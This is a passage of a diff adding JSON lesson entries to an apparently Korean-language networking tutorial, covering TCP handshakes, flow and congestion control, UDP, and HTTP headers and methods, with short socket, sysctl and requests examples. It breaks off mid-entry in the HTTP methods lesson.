+        "content": "### TCP 연결 상태\n\n```\nLISTEN: 연결 대기 중 (서버)\nESTABLISHED: 연결됨 (통신 중)\nTIME_WAIT: 연결 종료 대기\nCLOSE_WAIT: 종료 대기 (상대가 끊음)\nFIN_WAIT: 종료 요청 보냄\n```\n\n### TCP가 쓰이는 곳\n\n```\n✅ TCP 사용\n├── HTTP/HTTPS (웹)\n├── FTP (파일 전송)\n├── SMTP/POP3 (이메일)\n├── SSH (원격 접속)\n└── 데이터 정확성이 중요한 모든 곳\n```"
+      }
+    ]
+  },
+  "02_TCP_UDP/tcp-congestion-control": {
+    "id": "02_TCP_UDP/tcp-congestion-control",
+    "title": "TCP 혼잡 제어",
+    "category": "network",
+    "subCategory": "02_TCP_UDP",
+    "language": "Python",
+    "description": "TCP의 혼잡 제어 알고리즘을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 혼잡 제어란?",
+        "content": "## 🔥 한 줄 요약\n> **네트워크 상황에 맞춰 속도 조절** - 도로 정체 피하기!\n\n---\n\n## 💡 흐름 제어 vs 혼잡 제어\n\n```\n🚰 흐름 제어\n├── 받는 쪽(컵) 크기에 맞춤\n└── 수신자 보호\n\n🚗 혼잡 제어\n├── 도로(네트워크) 상황에 맞춤\n└── 네트워크 보호\n```\n\n---\n\n## 🎯 혼잡 제어 단계\n\n### 1. Slow Start (천천히 시작)\n\n```\n처음엔 조심스럽게:\n\n윈도우: 1 → 2 → 4 → 8 → 16...\n     (지수적 증가)\n\n임계점(threshold)까지 빠르게 증가\n```\n\n### 2. Congestion Avoidance (혼잡 회피)\n\n```\n임계점 이후:\n\n윈도우: 16 → 17 → 18 → 19...\n     (선형적 증가)\n\n조심스럽게 증가\n```\n\n### 3. 혼잡 감지 시\n\n```\n패킷 손실 발생!\n\n방법 1 (타임아웃):\n├── 윈도우를 1로 확 줄임\n└── Slow Start부터 다시\n\n방법 2 (중복 ACK):\n├── 윈도우를 절반으로\n└── Congestion Avoidance부터\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 혼잡 제어 확인",
+        "content": "### 현재 알고리즘 확인\n\n```bash\n# Linux\ncat /proc/sys/net/ipv4/tcp_congestion_control\n# cubic (기본값)\n\n# 사용 가능한 알고리즘\ncat /proc/sys/net/ipv4/tcp_available_congestion_control\n# reno cubic bbr\n\n# 변경\nsudo sysctl -w net.ipv4.tcp_congestion_control=bbr\n```\n\n### TCP BBR (Bottleneck Bandwidth and RTT)\n\n```bash\n# Google이 만든 최신 알고리즘\n# 손실 기반이 아닌 측정 기반\n\n# BBR 활성화 (Linux 4.9+)\nsudo modprobe tcp_bbr\nsudo sysctl -w net.ipv4.tcp_congestion_control=bbr\n\n# 확인\nsysctl net.ipv4.tcp_congestion_control\n```\n\n### 윈도우 크기 변화 관찰\n\n```bash\n# ss 명령으로 실시간 확인\nss -ti\n\n# 결과에서 cwnd (congestion window) 확인\n# cwnd:10 = 현재 혼잡 윈도우 10 세그먼트\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 알고리즘 비교",
+        "content": "### 주요 알고리즘\n\n```\nReno (전통적):\n├── 손실 기반\n├── 손실 = 혼잡\n└── 단순하지만 비효율\n\nCUBIC (Linux 기본):\n├── 고속 네트워크 최적화\n├── 큐빅 함수로 증가\n└── 대부분 환경에 적합\n\nBBR (Google):\n├── 대역폭/지연 측정\n├── 손실에 덜 민감\n└── 장거리/고속에 좋음\n```\n\n### 선택 가이드\n\n```\n일반적: CUBIC (기본값)\n장거리 서버: BBR\n저지연 필요: BBR\n고손실 환경: BBR\n```"
+      }
+    ]
+  },
+  "02_TCP_UDP/tcp-flow-control": {
+    "id": "02_TCP_UDP/tcp-flow-control",
+    "title": "TCP 흐름 제어",
+    "category": "network",
+    "subCategory": "02_TCP_UDP",
+    "language": "Python",
+    "description": "TCP의 흐름 제어 메커니즘을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 흐름 제어란?",
+        "content": "## 🔥 한 줄 요약\n> **받는 쪽 속도에 맞춰 보내기** - 물 넘치지 않게!\n\n---\n\n## 💡 왜 필요한가?\n\n### 비유:\n```\n🚰 물 따르기\n├── 컵이 작은데 물을 확 부으면?\n├── 넘침!\n└── 컵 크기 보고 천천히 따라야\n\n📨 데이터 전송\n├── 수신 버퍼가 작은데 데이터 확 보내면?\n├── 손실!\n└── 버퍼 크기 보고 조절해야\n```\n\n---\n\n## 🎯 슬라이딩 윈도우\n\n```\n윈도우 = 한 번에 보낼 수 있는 양\n\n송신자: \"버퍼 얼마나 남았어?\"\n수신자: \"1000바이트 남았어\" (Window Size)\n송신자: \"그럼 1000바이트까지만 보낼게\"\n\n수신자가 처리하면:\n수신자: \"이제 2000바이트 가능해\"\n송신자: \"알겠어, 더 보낼게\"\n```\n\n### 동작 과정\n\n```\n수신 윈도우: 4KB\n\n1. 송신: 1KB 전송\n   수신 윈도우: 3KB (1KB 받음)\n\n2. 송신: 1KB 전송\n   수신 윈도우: 2KB\n\n3. 애플리케이션이 2KB 읽음\n   수신 윈도우: 4KB (다시 여유)\n\n4. ACK로 윈도우 크기 알림\n   \"Window: 4096\"\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 윈도우 확인",
+        "content": "### TCP 윈도우 크기 확인\n\n```bash\n# Wireshark에서 TCP 패킷 보면:\n# Window size value: 65535\n# [Calculated window size: 65535]\n\n# tcpdump로 확인\nsudo tcpdump -i any tcp -nn -v\n# ... win 65535 ...\n```\n\n### 소켓 버퍼 설정\n\n```python\nimport socket\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# 수신 버퍼 크기 설정\nsock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)\n\n# 송신 버퍼 크기 설정\nsock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)\n\n# 현재 버퍼 크기 확인\nrecv_buf = sock.getsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF)\nsend_buf = sock.getsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF)\nprint(f\"수신 버퍼: {recv_buf}, 송신 버퍼: {send_buf}\")\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 성능 튜닝",
+        "content": "### 윈도우 크기 조절\n\n```\n너무 작으면:\n├── 자주 ACK 기다림\n└── 속도 저하\n\n너무 크면:\n├── 메모리 낭비\n├── 손실 시 재전송 많음\n\n적절한 크기:\n└── 대역폭 × 지연시간\n└── 예: 100Mbps × 50ms = 625KB\n```\n\n### Linux 튜닝\n\n```bash\n# 자동 조절 활성화 (기본값)\nnet.ipv4.tcp_window_scaling = 1\n\n# 버퍼 크기 범위\nnet.core.rmem_max = 16777216\nnet.core.wmem_max = 16777216\n```"
+      }
+    ]
+  },
+  "02_TCP_UDP/tcp-handshake": {
+    "id": "02_TCP_UDP/tcp-handshake",
+    "title": "TCP 3-Way Handshake",
+    "category": "network",
+    "subCategory": "02_TCP_UDP",
+    "language": "Python",
+    "description": "TCP 연결 수립 과정을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 3-Way Handshake란?",
+        "content": "## 🔥 한 줄 요약\n> **\"연결해도 돼?\" → \"응, 나도!\" → \"알겠어!\"** - 세 번의 악수!\n\n---\n\n## 💡 왜 세 번인가?\n\n### 전화 거는 것과 비슷:\n```\n📞 전화 연결\n1. 나: \"여보세요?\" (전화 검)\n2. 상대: \"네, 여보세요!\" (받음)\n3. 나: \"아, 연결됐네!\" (확인)\n→ 이제 대화 시작!\n\n🌐 TCP 연결\n1. 클라이언트: \"연결할게!\" (SYN)\n2. 서버: \"응, 나도 연결!\" (SYN+ACK)\n3. 클라이언트: \"확인!\" (ACK)\n→ 이제 데이터 전송!\n```\n\n---\n\n## 🎯 상세 과정\n\n```\n클라이언트                     서버\n    │                           │\n    │──── SYN (seq=100) ───────▶│\n    │     \"연결 요청!\"            │ LISTEN\n    │                           │   ↓\n    │◀─ SYN+ACK (seq=200,       │ SYN_RECEIVED\n    │         ack=101) ─────────│\n    │     \"응, 나도 연결!\"        │\n    │                           │\n    │──── ACK (ack=201) ────────▶│\n    │     \"확인!\"                │ ESTABLISHED\n    │                           │\n ESTABLISHED                    │\n    │◀═══ 데이터 전송 시작 ══════▶│\n```\n\n### 각 단계 설명\n\n```\n1단계 - SYN (Synchronize)\n├── 클라이언트 → 서버\n├── \"나 연결하고 싶어\"\n└── seq=100 (내 시작 번호)\n\n2단계 - SYN+ACK\n├── 서버 → 클라이언트\n├── \"응 알겠어, 나도 연결하고 싶어\"\n├── ack=101 (네 100 받았고, 다음은 101 보내)\n└── seq=200 (내 시작 번호)\n\n3단계 - ACK (Acknowledge)\n├── 클라이언트 → 서버\n├── \"확인했어!\"\n└── ack=201 (네 200 받았어)\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 Handshake 확인",
+        "content": "### Wireshark로 확인\n\n```\n패킷 1: [SYN] Seq=0\n패킷 2: [SYN, ACK] Seq=0 Ack=1\n패킷 3: [ACK] Seq=1 Ack=1\n패킷 4: [HTTP] GET /index.html  (데이터 전송 시작)\n```\n\n### tcpdump로 캡처\n\n```bash\n# TCP 패킷 캡처\nsudo tcpdump -i any tcp port 80 -nn\n\n# 결과 예시:\n# 192.168.0.10.54321 > 93.184.216.34.80: Flags [S], seq 12345\n# 93.184.216.34.80 > 192.168.0.10.54321: Flags [S.], seq 67890, ack 12346\n# 192.168.0.10.54321 > 93.184.216.34.80: Flags [.], ack 67891\n\n# Flags 의미:\n# [S] = SYN\n# [S.] = SYN+ACK\n# [.] = ACK\n# [P.] = PUSH+ACK (데이터)\n# [F.] = FIN+ACK (종료)\n```\n\n### Python으로 연결 테스트\n\n```python\nimport socket\nimport time\n\n# 연결 시간 측정\nstart = time.time()\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('google.com', 80))  # 여기서 3-way handshake!\n\nelapsed = time.time() - start\nprint(f\"연결 시간: {elapsed*1000:.2f}ms\")\n\nsock.close()\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 면접 포인트",
+        "content": "### 자주 묻는 질문\n\n```\nQ: 왜 2-way가 아니라 3-way?\nA: 양쪽 모두 송수신 가능 확인 필요\n   2-way면 서버→클라이언트 확인 불가\n\nQ: SYN Flood 공격이란?\nA: SYN만 보내고 ACK 안 보내서\n   서버 리소스 고갈시키는 공격\n   해결: SYN Cookie, 방화벽\n\nQ: seq 번호는 왜 랜덤?\nA: 보안! 예측 가능하면 위조 가능\n```\n\n### 연결 실패 케이스\n\n```\n1. 서버가 꺼져 있음\n   → SYN 보냈는데 응답 없음\n   → 타임아웃 후 연결 실패\n\n2. 방화벽 차단\n   → SYN 보냈는데 RST(거절) 받음\n   → 즉시 연결 실패\n\n3. 포트가 열려있지 않음\n   → RST 응답\n   → \"Connection refused\"\n```"
+      }
+    ]
+  },
+  "02_TCP_UDP/tcp-teardown": {
+    "id": "02_TCP_UDP/tcp-teardown",
+    "title": "TCP 연결 종료",
+    "category": "network",
+    "subCategory": "02_TCP_UDP",
+    "language": "Python",
+    "description": "TCP 4-Way Handshake를 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 4-Way Handshake란?",
+        "content": "## 🔥 한 줄 요약\n> **\"끊을게\" → \"응\" → \"나도 끊을게\" → \"응\"** - 네 번의 악수로 종료!\n\n---\n\n## 💡 왜 네 번인가?\n\n### 전화 끊기와 비슷:\n```\n📞 전화 끊기 (양쪽 다 할 말 마무리)\n\n1. 나: \"나 이제 끊을게\" (FIN)\n2. 상대: \"응, 알겠어\" (ACK)\n   상대: (아직 할 말 마무리 중...)\n3. 상대: \"나도 끊을게\" (FIN)\n4. 나: \"응, 잘 가!\" (ACK)\n→ 통화 종료!\n```\n\n---\n\n## 🎯 상세 과정\n\n```\n클라이언트                     서버\n    │                           │\n    │──── FIN (seq=100) ───────▶│\n    │     \"나 끊을게\"            │\n    │                           │\n    │◀──── ACK (ack=101) ───────│\n    │     \"응 알겠어\"            │\n    │                           │\n    │   (서버가 남은 데이터 전송)  │\n    │                           │\n    │◀──── FIN (seq=200) ───────│\n    │     \"나도 끊을게\"          │\n    │                           │\n    │──── ACK (ack=201) ────────▶│\n    │     \"응 잘가\"              │\n    │                           │\n TIME_WAIT                   CLOSED\n (잠시 대기)\n    │\n CLOSED\n```\n\n### 왜 3-way가 아니라 4-way?\n\n```\n연결할 때: 동시에 가능\n├── SYN: \"연결하자!\"\n├── SYN+ACK: \"응, 나도!\" (2개 합침)\n└── ACK: \"확인!\"\n\n종료할 때: 순차적\n├── FIN: \"나 끊을게\"\n├── ACK: \"응\" (아직 보낼 데이터 있을 수 있음)\n├── FIN: \"나도 끊을게\" (데이터 다 보낸 후)\n└── ACK: \"응\"\n\n→ 양쪽이 독립적으로 종료!\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 연결 종료 확인",
+        "content": "### 상태 변화\n\n```\n클라이언트 상태            서버 상태\n────────────────────────────────────\nESTABLISHED              ESTABLISHED\n     │ (FIN 전송)              │\nFIN_WAIT_1                     │\n     │                   (FIN 수신)\n     │                   CLOSE_WAIT\n     │ (ACK 수신)              │\nFIN_WAIT_2                     │\n     │                   (FIN 전송)\n     │                   LAST_ACK\n     │ (FIN 수신)              │\nTIME_WAIT                      │\n     │ (ACK 전송)              │\n     │                      CLOSED\n(2MSL 대기)\nCLOSED\n```\n\n### TIME_WAIT 확인\n\n```bash\n# TIME_WAIT 상태 연결 확인\nnetstat -an | grep TIME_WAIT\n\n# 많으면 서버에 부하\n# 보통 60초 후 자동 정리\n```\n\n### Python 연결 종료\n\n```python\nimport socket\n\nclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient.connect(('example.com', 80))\n\n# 데이터 주고받기\nclient.send(b\"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\")\nresponse = client.recv(1024)\n\n# 정상 종료 (4-way handshake)\nclient.close()\n\n# 강제 종료 (RST 전송)\n# client.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))\n# client.close()\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 TIME_WAIT",
+        "content": "### TIME_WAIT가 필요한 이유\n\n```\n1. 지연된 패킷 처리\n   └── 아직 도착 안 한 패킷 대기\n\n2. 새 연결과 혼동 방지\n   └── 같은 포트 재사용 시\n       이전 연결 패킷과 구분\n\n기본값: 2 × MSL (Maximum Segment Lifetime)\n보통: 60초 ~ 4분\n```\n\n### 서버에서 TIME_WAIT 문제\n\n```bash\n# TIME_WAIT 많으면 포트 고갈!\n\n# 해결 1: SO_REUSEADDR 옵션\nserver.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n\n# 해결 2: 커널 파라미터 조정 (Linux)\nnet.ipv4.tcp_tw_reuse = 1\n```"
+      }
+    ]
+  },
+  "02_TCP_UDP/tcp-vs-udp": {
+    "id": "02_TCP_UDP/tcp-vs-udp",
+    "title": "TCP vs UDP",
+    "category": "network",
+    "subCategory": "02_TCP_UDP",
+    "language": "Python",
+    "description": "TCP와 UDP의 차이점을 비교합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 TCP vs UDP 비교",
+        "content": "## 🎯 비교표\n\n| 특성 | TCP | UDP |\n|-----|-----|-----|\n| 연결 | 연결 지향 | 비연결 |\n| 신뢰성 | 보장 | 미보장 |\n| 순서 | 보장 | 미보장 |\n| 속도 | 느림 | 빠름 |\n| 오버헤드 | 큼 | 작음 |\n| 흐름제어 | 있음 | 없음 |\n| 혼잡제어 | 있음 | 없음 |\n\n---\n\n## 🎯 헤더 크기 비교\n\n```\nTCP 헤더: 20~60 bytes\n├── 출발지 포트 (2)\n├── 도착지 포트 (2)\n├── 순서 번호 (4)\n├── 확인 번호 (4)\n├── 플래그 등 (4)\n├── 체크섬 (2)\n└── 옵션 (가변)\n\nUDP 헤더: 8 bytes\n├── 출발지 포트 (2)\n├── 도착지 포트 (2)\n├── 길이 (2)\n└── 체크섬 (2)\n\n→ UDP가 훨씬 가벼움!\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 프로토콜별 사용 예시",
+        "content": "### TCP 기반 프로토콜\n\n```\nHTTP/HTTPS (웹): TCP 80/443\n├── 웹페이지 정확히 받아야 함\n\nFTP (파일 전송): TCP 21\n├── 파일 깨지면 안 됨\n\nSMTP (이메일): TCP 25\n├── 이메일 내용 정확해야 함\n\nSSH (원격 접속): TCP 22\n├── 명령어 정확히 전달\n```\n\n### UDP 기반 프로토콜\n\n```\nDNS: UDP 53\n├── 짧은 요청, 빠른 응답\n\nDHCP: UDP 67/68\n├── IP 자동 할당\n\nNTP: UDP 123\n├── 시간 동기화\n\n게임, 스트리밍: 다양한 포트\n├── 실시간성 중요\n```\n\n### 속도 테스트\n\n```python\nimport socket\nimport time\n\n# TCP 연결 시간\nstart = time.time()\ntcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ntcp.connect(('google.com', 80))\ntcp.close()\nprint(f\"TCP 연결: {(time.time()-start)*1000:.2f}ms\")\n\n# UDP는 연결 없음 = 0ms\nudp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nudp.sendto(b\"test\", ('8.8.8.8', 53))  # 바로 전송\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 선택 가이드",
+        "content": "### 결정 흐름\n\n```\n데이터 손실 허용?\n├── NO → TCP\n└── YES ↓\n\n실시간성 중요?\n├── YES → UDP\n└── NO → TCP\n\n작은 패킷 많이?\n├── YES → UDP (오버헤드 적음)\n└── NO → TCP\n```\n\n### 하이브리드 예시\n\n```\n온라인 게임:\n├── 로그인, 결제: TCP (정확성)\n├── 캐릭터 이동: UDP (실시간)\n└── 채팅: TCP (메시지 정확)\n\n스트리밍:\n├── 인증, 메타데이터: TCP\n└── 영상 데이터: UDP\n```"
+      }
+    ]
+  },
+  "02_TCP_UDP/udp-concept": {
+    "id": "02_TCP_UDP/udp-concept",
+    "title": "UDP 개념",
+    "category": "network",
+    "subCategory": "02_TCP_UDP",
+    "language": "Python",
+    "description": "UDP의 특징과 사용 사례를 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 UDP란?",
+        "content": "## 🔥 한 줄 요약\n> **빠르지만 보장 없는 전송** - 일반 우편처럼!\n\n---\n\n## 💡 TCP vs UDP\n\n### 비유로 이해:\n```\n📦 TCP = 등기우편\n├── 배달 확인 받음\n├── 분실 시 재배송\n├── 느리지만 확실\n└── 비쌈\n\n📨 UDP = 일반 엽서\n├── 보내면 끝\n├── 도착 확인 X\n├── 빠름\n└── 저렴\n```\n\n---\n\n## 🎯 UDP 특징\n\n### 연결 없음 (Connectionless)\n\n```\nTCP: \"연결할게\" → \"응\" → \"확인\" → 데이터\nUDP: 바로 데이터 전송!\n\n→ 핸드셰이크 없어서 빠름\n```\n\n### 신뢰성 없음\n\n```\nUDP:\n├── 도착 확인 X\n├── 순서 보장 X\n├── 손실되면 그냥 손실\n└── 대신 빠름!\n\n쓰는 이유:\n├── 약간 손실되도 OK (영상, 게임)\n├── 속도가 중요\n└── 직접 신뢰성 구현\n```\n\n### 사용 사례\n\n```\n🎮 온라인 게임\n└── 1/60초마다 위치 전송\n└── 하나 잃어버려도 다음 거 받으면 됨\n\n📺 라이브 스트리밍\n└── 버퍼링보다 끊김이 나음\n└── 손실된 프레임 스킵\n\n📞 VoIP (인터넷 전화)\n└── 실시간성 중요\n└── 약간 끊겨도 대화 가능\n\n🌐 DNS\n└── 짧은 요청/응답\n└── 빠른 응답 필요\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 UDP 통신",
+        "content": "### UDP 서버\n\n```python\nimport socket\n\n# UDP 소켓 (SOCK_DGRAM)\nserver = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nserver.bind(('0.0.0.0', 8080))\n\nprint(\"UDP 서버 시작\")\n\nwhile True:\n    data, addr = server.recvfrom(1024)\n    print(f\"받음: {data.decode()} from {addr}\")\n    server.sendto(b\"OK\", addr)\n```\n\n### UDP 클라이언트\n\n```python\nimport socket\n\nclient = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n# 연결 없이 바로 전송!\nclient.sendto(b\"Hello UDP!\", ('localhost', 8080))\n\n# 응답 받기\ndata, addr = client.recvfrom(1024)\nprint(f\"응답: {data.decode()}\")\n\nclient.close()\n```\n\n### 브로드캐스트\n\n```python\n# UDP로 네트워크 전체에 전송\nclient = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nclient.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)\nclient.sendto(b\"Hello everyone!\", ('255.255.255.255', 8080))\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 TCP vs UDP 선택",
+        "content": "### 언제 뭘 쓸까?\n\n```\nTCP 선택:\n├── 데이터 손실 불가\n├── 순서 중요\n├── 파일 전송, 웹, 이메일\n\nUDP 선택:\n├── 실시간성 중요\n├── 약간 손실 OK\n├── 게임, 스트리밍, VoIP\n```\n\n### UDP + 신뢰성\n\n```\nUDP 위에 신뢰성 구현:\n├── QUIC (HTTP/3)\n├── WebRTC\n└── 게임 자체 프로토콜\n\n→ 필요한 것만 구현해서 효율적\n```"
+      }
+    ]
+  },
+  "03_HTTP/http-header": {
+    "id": "03_HTTP/http-header",
+    "title": "HTTP 헤더",
+    "category": "network",
+    "subCategory": "03_HTTP",
+    "language": "JavaScript",
+    "description": "HTTP 헤더의 종류와 역할을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 HTTP 헤더란?",
+        "content": "## 🔥 한 줄 요약\n> **요청/응답의 부가 정보** - 편지의 봉투 정보!\n\n---\n\n## 🎯 헤더 분류\n\n### 요청 헤더\n\n```\nHost: api.example.com\n└── 요청할 서버\n\nAccept: application/json\n└── 원하는 응답 형식\n\nAuthorization: Bearer token\n└── 인증 정보\n\nContent-Type: application/json\n└── 보내는 데이터 형식\n\nUser-Agent: Chrome/91.0\n└── 브라우저/클라이언트 정보\n\nCookie: session=abc123\n└── 쿠키 전송\n```\n\n### 응답 헤더\n\n```\nContent-Type: text/html\n└── 응답 데이터 형식\n\nContent-Length: 1234\n└── 응답 크기 (바이트)\n\nSet-Cookie: session=abc123\n└── 쿠키 설정\n\nCache-Control: max-age=3600\n└── 캐시 설정\n\nLocation: /new-page\n└── 리다이렉트 위치\n\nAccess-Control-Allow-Origin: *\n└── CORS 설정\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 헤더 사용 예시",
+        "content": "### 요청에 헤더 추가\n\n```python\nimport requests\n\nresponse = requests.get(\n    'https://api.example.com/users',\n    headers={\n        'Authorization': 'Bearer my-token',\n        'Accept': 'application/json',\n        'X-Custom-Header': 'custom-value'\n    }\n)\n\n# 응답 헤더 확인\nprint(response.headers['Content-Type'])\n```\n\n### JavaScript (fetch)\n\n```javascript\nconst response = await fetch('/api/data', {\n    headers: {\n        'Authorization': 'Bearer token',\n        'Content-Type': 'application/json',\n    }\n});\n\n// 응답 헤더 확인\nconsole.log(response.headers.get('Content-Type'));\n```\n\n### 서버에서 헤더 설정\n\n```python\nfrom flask import Flask, jsonify, make_response\n\n@app.route('/data')\ndef get_data():\n    response = make_response(jsonify({'data': 'value'}))\n    response.headers['X-Custom-Header'] = 'value'\n    response.headers['Cache-Control'] = 'no-cache'\n    return response\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 중요한 헤더",
+        "content": "### Content-Type 종류\n\n```\ntext/html              - HTML\ntext/plain             - 일반 텍스트\napplication/json       - JSON\napplication/xml        - XML\nmultipart/form-data    - 파일 업로드\napplication/x-www-form-urlencoded - 폼 데이터\n```\n\n### 캐시 관련 헤더\n\n```\nCache-Control: no-cache\n└── 캐시 안 함\n\nCache-Control: max-age=3600\n└── 1시간 캐시\n\nETag: \"abc123\"\n└── 버전 태그 (변경 감지)\n\nIf-None-Match: \"abc123\"\n└── 변경됐으면 보내줘\n```"
+      }
+    ]
+  },
+  "03_HTTP/http-intro": {
+    "id": "03_HTTP/http-intro",
+    "title": "HTTP 소개",
+    "category": "network",
+    "subCategory": "03_HTTP",
+    "language": "JavaScript",
+    "description": "HTTP 프로토콜의 기본을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 HTTP란?",
+        "content": "## 🔥 한 줄 요약\n> **웹에서 데이터 주고받는 규칙** - 브라우저와 서버의 대화법!\n\n---\n\n## 💡 왜 배워야 하나?\n\n### 웹 개발 = HTTP 이해\n```\n🌐 모든 웹 통신 = HTTP\n├── 웹사이트 접속\n├── API 호출\n├── 이미지 로딩\n├── 로그인 처리\n└── 다 HTTP!\n```\n\n### 실제 예시\n```\n브라우저에서 네이버 접속:\n\n1. 브라우저: \"GET /index.html 줘!\" (요청)\n2. 네이버 서버: \"여기 있어!\" (응답)\n3. 브라우저: 화면에 표시\n\n→ 이게 HTTP 통신!\n```\n\n---\n\n## 🎯 HTTP 특징\n\n### 1. 요청-응답 구조\n```\n클라이언트 ──요청──▶ 서버\n          ◀──응답──\n```\n\n### 2. 무상태 (Stateless)\n```\n서버: \"너 누구야? 처음 보는데?\"\n클라이언트: \"아까 로그인했잖아!\"\n서버: \"기억 안 나...\"\n\n→ 매 요청이 독립적\n→ 상태 유지하려면 쿠키/세션 필요\n```\n\n### 3. 텍스트 기반\n```\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n<html>...</html>\n\n→ 사람이 읽을 수 있음!\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 HTTP 요청/응답",
+        "content": "### HTTP 요청 구조\n\n```http\nGET /users/1 HTTP/1.1\nHost: api.example.com\nAccept: application/json\nAuthorization: Bearer token123\n\n(본문 - GET은 보통 없음)\n```\n\n### HTTP 응답 구조\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\nContent-Length: 45\n\n{\"id\": 1, \"name\": \"김철수\"}\n```\n\n### Python으로 HTTP 요청\n\n```python\nimport requests\n\n# GET 요청\nresponse = requests.get('https://api.example.com/users')\nprint(response.status_code)  # 200\nprint(response.json())       # 응답 데이터\n\n# POST 요청\nresponse = requests.post(\n    'https://api.example.com/users',\n    json={'name': '김철수', 'email': 'kim@test.com'}\n)\n```\n\n### JavaScript (fetch)\n\n```javascript\n// GET\nconst response = await fetch('https://api.example.com/users');\nconst data = await response.json();\n\n// POST\nconst response = await fetch('https://api.example.com/users', {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify({ name: '김철수' })\n});\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 개발자 도구",
+        "content": "### 브라우저에서 HTTP 확인\n\n```\nChrome 개발자 도구 (F12)\n└── Network 탭\n    ├── 모든 HTTP 요청 확인\n    ├── 헤더, 응답 내용 확인\n    └── 시간 측정\n```\n\n### HTTP 학습 순서\n\n```\n1. 요청/응답 구조\n2. HTTP 메서드 (GET, POST...)\n3. 상태 코드 (200, 404...)\n4. 헤더 (Content-Type, Authorization...)\n5. HTTPS (보안)\n```"
+      }
+    ]
+  },
+  "03_HTTP/http-method": {
+    "id": "03_HTTP/http-method",
+    "title": "HTTP 메서드",
+    "category": "network",
+    "subCategory": "03_HTTP",
+    "language": "JavaScript",
+    "description": "GET, POST, PUT, DELETE 등 HTTP 메서드를 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 HTTP 메서드란?",
+        "content": "## 🔥 한 줄 요약\n> **서버에게 원하는 작업을 알려주는 동사** - \"조회해줘\", \"생성해줘\"\n\n---\n\n## 🎯 주요 메서드\n\n### CRUD와 매핑\n\n```\nCreate  → POST   (생성)\nRead    → GET    (조회)\nUpdate  → PUT/PATCH (수정)\nDelete  → DELETE (삭제)\n```\n\n### 메서드별 특징\n\n```\n📖 GET (조회)\n├── 데이터 가져오기\n├── 본문(body) 없음\n├── URL에 파라미터 (?name=kim)\n└── 브라우저 주소창 = GET\n\n📝 POST (생성)\n├── 새 데이터 만들기\n├── 본문에 데이터 포함\n├── 여러 번 호출 = 여러 개 생성\n└── 폼 제출 = POST\n\n✏️ PUT (전체 수정)\n├── 데이터 전체 교체\n├── 같은 요청 여러 번 = 결과 동일\n└── 없으면 생성도 가능\n\n🩹 PATCH (부분 수정)\n├── 일부만 수정\n└── 변경할 필드만 전송\n\n🗑️ DELETE (삭제)\n├── 데이터 삭제\n└── 같은 요청 여러 번 = 결과 동일\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 메서드 사용 예시",
+        "content": "### REST API 예시\n\n```http\n# 유저 목록 조회\nGET /users HTTP/1.1\n\n# 특정 유저 조회\nGET /users/1 HTTP/1.1\n\n# 유저 생성\nPOST /users HTTP/1.1\nContent-Type: application/json\n\n{\"name\": \"김철수\", \"email\": \"kim@test.com\"}\n\n# 유저 전체 수정\nPUT /users/1 HTTP/1.1\nContent-Type: application/json\n\n{\"name\": \"김철수\", \"email\": \"kim2@test.com\", \"age\": 30}\n\n# 유저 부분 수정\nPATCH /users/1 HTTP/1.1\nContent-Type: application/json\n\n{\"email\": \"newemail@test.com\"}\n\n# 유저 삭제\nDELETE /users/1 HTTP/1.1\n```\n\n### Python 예시\n\n```python\nimport requests\n\n# GET\nusers = requests.get('/users').json()\n\n# POST\nnew_user = requests.post('/users', json={\n    'name': '김철수'\n}).json()\n\n# PUT\nrequests.put('/users/1', json={\n    'name': '김철수',\n    'email': 'new@test.com'\n})\n\n# 